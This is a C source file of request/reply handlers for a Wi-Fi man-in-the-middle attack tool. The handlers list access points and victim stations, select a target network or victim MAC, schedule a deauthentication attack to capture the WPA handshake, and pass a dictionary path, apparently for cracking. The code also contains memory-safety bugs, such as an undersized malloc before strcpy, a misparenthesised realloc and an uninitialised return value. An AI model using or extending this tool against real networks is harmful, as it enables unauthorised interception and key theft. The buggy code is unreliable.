#include "mitm_action.h"

char report[BUFFER_LEN];

static char ** parse_command(char *line, int *count) {
	       char **options;
        if (!line)
                return NULL;
        char *option = strchr(line, '?');
        if (!option)
                return NULL;
        else {
                option = option + 1;
                char delim = '&';
                int i = 0;
                options = malloc(sizeof(char*));
                for(char *tmp = strtok(option, &delim); tmp; tmp = strtok(NULL, &delim)) {
                        options = realloc(options,i+1 * sizeof(char *));
                        options[i] = malloc(sizeof(tmp));
                        strcpy(options[i], tmp);
                        printf("%s\n", options[i]);
                        i++;
                }
                *count = i;
        }
        return options;
}

static int MITM_read_ap_search(struct MITM* MITM) {
	MITM->state = MITM_state_ap_search;
	return 0;
}

void mitm_ctrl_connect_request_action (void *action_data, void *usr_data, char *options) {}

void mitm_ctrl_connect_reply_action (void *action_data, void *usr_data, char *options) {}

void mitm_ctrl_disconnect_request_action (void *action_data, void *usr_data, char *options) {}

void mitm_ctrl_disconnect_reply_action (void *action_data, void *usr_data, char *options) {}

void mitm_get_ap_list_request_action (void *action_data, void *usr_data, char *options) {
	struct mitm_recv_info *recv_info = (struct mitm_recv_info *)action_data;
	struct MITM *MITM = (struct MITM *)usr_data;

	int ret;
	struct access_point_info *tmp;
	
	sprintf(report, "%s:[", MITM_GET_AP_LIST_REPLY);
	dl_list_for_each(tmp, &MITM->ap_list, struct access_point_info, ap_node) {
		char buf[100];
		sprintf(buf, "{\"SSID\":\"%s\",\"BSSID\":\"" MACSTR "\",\"Channel\":\"%d\"},", tmp->SSID,
			       	MAC2STR(tmp->BSSID), tmp->channel);
		strncat(report, buf, strlen(buf));
	}
	char *ch = strrchr(report, ',');
	if (ch) 
		*ch = ']';
	else
		strcat(report, "]");
	ret = sendto(recv_info->sock_fd, report, strlen(report), recv_info->send_flags,
		       	(const struct sockaddr *)&recv_info->recv_from, recv_info->length);
	if (ret < 0) 
		log_printf(MSG_WARNING, "[CTRL]%s: Sendto failed, err:%s", __func__, strerror(errno));
}

void mitm_get_ap_list_reply_action (void *action_data, void *usr_data, char *options) {
	log_printf(MSG_INFO, "%5s%40s%25s", "SSID", "BSSID", "Channel");
	log_printf(MSG_INFO,"-------------------------------------------------------------------");
	char *head, *tail, *tmp;
	char buffer[100], contain[100];

	for (tmp = options; tmp - options < strlen(options);) {
		memset(buffer, 0, 100);
		head = strchr(tmp, '{');
		tail = strchr(tmp, '}') + 1;
		if (!head || !tail)
			break;
		int length = tail - head;
		memcpy(buffer, head + 1, length - 2);
		memset(contain, 0, 100);
		for (char *tmp2 = strtok(buffer, ","); tmp2; tmp2 = strtok(NULL, ",")) {
			char *sep = strchr(tmp2, ':');
			int offset = 0;
			if (!memcmp(tmp2, "\"SSID\"", sep - tmp2)) {
				offset = 0;
			} else if (!memcmp(tmp2, "\"BSSID\"", sep - tmp2)) {
				offset = 50;
			} else if (!memcmp(tmp2, "\"Channel\"", sep - tmp2)) {
				offset = 80;
			} else 
				continue;
			memcpy(&contain[offset], sep + 1, strlen(tmp2) - (sep - tmp2));
		}
		log_printf(MSG_INFO, "%-35s%-30s%-10s", contain, &contain[50], &contain[80]);
		tmp = tail;
	}

}

void mitm_get_dictionary_request_action(void *action_data, void *usr_data, char *options) {
	struct mitm_recv_info *recv_info = (struct mitm_recv_info *)action_data;
	struct MITM *MITM = (struct MITM *)usr_data;
	char *path;
	int ret;
	path = malloc(BUFFER_LEN);
	if (!path) {
		log_printf(MSG_WARNING, "Malloc memory failed, with error:%s", strerror(errno));
		return;
	}
	memset(path, 0, BUFFER_LEN);
	log_printf(MSG_INFO, "Specify dictionary path:");
	fgets(path, BUFFER_LEN, stdin);
	snprintf(report, BUFFER_LEN, "%s?%s", MITM_GET_DICTIONARY_REPLY, path);
	sendto(recv_info->sock_fd, report, strlen(report), recv_info->send_flags,
			(const struct sockaddr *)&recv_info->recv_from, recv_info->length);
	if (ret < 0)
		log_printf(MSG_WARNING, "[CTRL] sendto failed, with error:%s", __func__, strerror(errno));
	free(path);
}

void mitm_get_dictionary_reply_action(void *action_data, void *usr_data, char *options) {
	struct MITM *MITM = (struct MITM*) usr_data;
	char *path = strchr(options, '?');
	if (*path == '?') path++;
	MITM->dict_path = strdup(path);

}

void mitm_set_victim_request_action (void *action_data, void *usr_data, char *options){
	struct mitm_recv_info *recv_info = (struct mitm_recv_info *) action_data;
	struct MITM *MITM = (struct MITM*) usr_data;
	struct victim_info target;
	struct victim_info *tmp;
	int match = 0, ret;
	char buf[256];
	memset(report, 0, BUFFER_LEN);
	options = strchr(options, '?');
	if (options) {
		if (find_info_tag(buf, sizeof(buf), "MAC", options)) {
			int offset = 0;
			for (char *mac = strtok(buf, ":"); mac; mac = strtok(NULL, ":")) {
				target.mac[offset++] = strtol(mac, NULL, 16);
			}
		}
	}
	dl_list_for_each(tmp, &MITM->victim_list, struct victim_info, victim_node) {
		if (!memcmp(target.mac, tmp->mac, ETH_ALEN)) {
			match = 1;
			memcpy(MITM->encry_info.SA, target.mac, ETH_ALEN);
			// Start deauth attack again to take the PTK between specify AP and STA.
			MITM->state = MITM_state_capture_handshake;
			// Send postive reply.
		}
	}
	sprintf(report, "%s:%s,"MACSTR, MITM_SET_VICTIM_REPLY, 
					match? MITM_COMMAND_OK : MITM_COMMAND_NOT_FOUND, MAC2STR(target.mac));
	ret = sendto(recv_info->sock_fd, report, strlen(report), recv_info->send_flags,
				(const struct sockaddr *)&recv_info->recv_from, recv_info->length);
	if (ret < 0) {
		log_printf(MSG_WARNING, "[%s]Send %s to client failed, with error:%s",
										__func__, match ? MITM_COMMAND_OK : MITM_COMMAND_NOT_FOUND, strerror(errno));
	}
	return;
}

void mitm_set_victim_reply_action (void *action_data, void *usr_data, char *options){
	char *head, *mac;
	head = strchr(options, ':');
	mac = strchr(options, ',');
	if (!head || !mac) {
		log_printf(MSG_WARNING, "[%s]Wrong reply format.");
		return;
	}
	head++;
	mac++;
	if (!strncmp(head, MITM_COMMAND_OK, strlen(MITM_COMMAND_OK))) {
		log_printf(MSG_INFO, "Accept Victim: "YELLOW"%s "NONE", taking PTK...", mac);
	} else if (!strncmp(head, MITM_COMMAND_NOT_FOUND, strlen(MITM_COMMAND_NOT_FOUND))) {
		log_printf(MSG_INFO, "Specify Victim: "YELLOW"%s "NONE"not found.", mac);
	} else {
		log_printf(MSG_INFO, "Unknow reply.");
	}
	return;
}

void mitm_get_victim_request_action (void *action_data, void *usr_data, char *options) {
  struct mitm_recv_info *recv_info = (struct mitm_recv_info *) action_data;
  struct MITM *MITM = (struct MITM*)usr_data;

  int ret;
  struct victim_info *tmp;
  sprintf(report, "%s:[", MITM_GET_VICTIM_LIST_REPLY);
  char buf[100];
  dl_list_for_each(tmp, &MITM->victim_list, struct victim_info, victim_node) {
    memset(buf, 0, sizeof(buf));
    sprintf(buf, MACSTR",", MAC2STR(tmp->mac));
    strncat(report, buf, strlen(buf));
  }
  char *ch = strrchr(report, ',');
  if (ch)
    *ch = ']';
  else
    strcat(report, "]");
  ret = sendto(recv_info->sock_fd, report, strlen(report), recv_info->send_flags, 
              (const struct sockaddr *)&recv_info->recv_from, recv_info->length);
  if (ret < 0)
    log_printf(MSG_WARNING, "[CTRL]%s: Sendto failed, with err:%s", __func__, strerror(errno));
}

void mitm_get_victim_reply_action (void *action_data, void *usr_data, char *options) {
  log_printf(MSG_INFO, "%5s%20s%40s", "Item", "MAC Address", "Victim List");
  log_printf(MSG_INFO,"-------------------------------------------------------------------");
  char *head = strchr(options, '[');
  char *tail = strchr(options, ']');
  *tail = '\0';
  if (!head) {
    log_printf(MSG_WARNING, "[%s] Wrong reply format.");
    return;
  }
  int counter = 1;
  for(char *tmp = strtok(head + 1, ","); tmp; tmp = strtok(NULL, ",")) {
    log_printf(MSG_INFO, "%3d%25s", counter++, tmp);
  }
}

// The request command should like `MITM-SET-AP-REQUEST?state=ap_search`.
void mitm_set_status_request_action (void *action_data, void *usr_data, char *line) {}

void mitm_set_status_reply_action (void *action_data, void *usr_data, char *options) {}

void mitm_set_ap_request_action (void *action_data, void *usr_data, char *options) {
	struct mitm_recv_info *recv_info = (struct mitm_recv_info *)action_data;
	struct MITM *MITM = (struct MITM*) usr_data;
	struct access_point_info target;
	struct access_point_info *tmp;
	int match = 0, ret;
	char buf[256];
	ap_init(&target);
	options = strchr(options, '?');
	if (options) {
		if (find_info_tag(buf, sizeof(buf), "SSID", options)) {
			target.SSID = strdup(buf);
		}
		if (find_info_tag(buf, sizeof(buf), "BSSID", options)) {
			int offset = 0;
			for (char* mac = strtok(buf, ":"); mac; mac = strtok(NULL, ":")) {
				target.BSSID[offset++] = strtol(mac, NULL, 16);
			}
		}
	}
	log_printf(MSG_DEBUG, "search SSID=%s, BSSID="MACSTR" access point", 
			target.SSID, MAC2STR(target.BSSID));
	dl_list_for_each(tmp, &MITM->ap_list, struct access_point_info, ap_node) {
		if(target.SSID ? !strcmp(tmp->SSID, target.SSID) : 0 || !memcmp(tmp->BSSID, target.BSSID, ETH_ALEN)) {
			memcpy(MITM->encry_info.AA, tmp->BSSID, ETH_ALEN);
			MITM->encry_info.SSID = strdup(tmp->SSID);
            MITM->encry_info.Channel = tmp->channel;
			MITM->state = MITM_state_capture_handshake;
			eloop_register_timeout(5, 0, deauth_attack, NULL, MITM);
			match = 1;
			break;
		} 
	}
	memset(buf, 0, sizeof(buf));
	snprintf(buf, sizeof(buf), "%s?%s",MITM_SET_AP_REPLY, match? MITM_COMMAND_OK: MITM_COMMAND_NOT_FOUND);
	
	ret = sendto(recv_info->sock_fd, buf, strlen(buf), recv_info->send_flags, 
			(const struct sockaddr *)&recv_info->recv_from, recv_info->length);
	if (ret < 0)
		log_printf(MSG_WARNING, "[CTRL]Send reply to  caller failed, with err:%s.", strerror(errno));
	free(target.SSID);
}

void mitm_set_ap_reply_action (void *action_data, void *usr_data, char *line) {}

void mitm_get_status_request_action (void *action_data, void *usr_data, char *options) {
	int ret;
	memset(report, 0, BUFFER_LEN);
	struct mitm_recv_info *recv_info = (struct mitm_recv_info *)action_data;
	struct MITM *MITM = (struct MITM*) usr_data;
	sprintf(report, "%s:%d", MITM_GET_STATUS_REPLY, MITM->state);
	ret = sendto(recv_info->sock_fd, report, strlen(report), recv_info->send_flags, 
			(const struct sockaddr *)&recv_info->recv_from, recv_info->length);
	if (ret < 0) 
		log_printf(MSG_WARNING, "[CTRL]Send reply to caller failed, with err:%s.",
				strerror(errno));
}

void mitm_get_status_reply_action (void *action_data, void *usr_data, char *options) {
	struct MITM_info *info = (struct MITM_info *)usr_data;
	int state;
	state = atoi(strchr(options, ':') + 1);
	if (info->state != state) {	
		info->state = state;
		kill(getpid(), SIGUSR1);
	}
}

void mitm_status_change_action (void *action_data, void *usr_data, char *options) {}

void mitm_start_attack_request_action (void *action_data, void *usr_data, char *options) {}

void mitm_start_attack_reply_action (void *action_data, void *usr_data, char *options) {}

void mitm_keep_alive_request_action (void *action_data, void *usr_data, char *options) {
	int ret;
	struct mitm_recv_info *recv_info = (struct mitm_recv_info *)action_data;
	log_printf(MSG_DEBUG, "[%s]:get a keep alive request from client", __func__);
	recv_info->send_flags = 0;
	ret = sendto(recv_info->sock_fd, MITM_KEEP_ALIVE_REPLY, sizeof(MITM_KEEP_ALIVE_REPLY), 
			recv_info->send_flags, (const struct sockaddr *)&recv_info->recv_from,
		       	recv_info->length);
	if (ret < 0) {
		log_printf(MSG_WARNING, "[%s] sendto failed, err:%s", __func__, strerror(errno));
	}
}

void mitm_keep_alive_reply_action (void *action_data, void *usr_data, char *options) {
	log_printf(MSG_DEBUG, "[keep alive] server return keep alive packet");
}
